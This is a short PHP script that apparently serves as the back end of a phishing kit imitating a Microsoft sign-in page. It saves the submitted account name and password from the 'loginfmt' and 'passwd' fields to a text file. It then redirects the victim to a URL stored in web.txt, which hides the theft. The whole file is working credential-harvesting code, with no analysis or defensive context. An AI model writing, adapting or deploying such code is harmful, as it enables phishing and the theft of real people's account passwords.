<?php

file_put_contents("usernames.txt", "Account: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
$file = "web.txt";
$fp = fopen($file, "r");
$contents = fread($fp, filesize($file));
header("location: $contents");
exit();
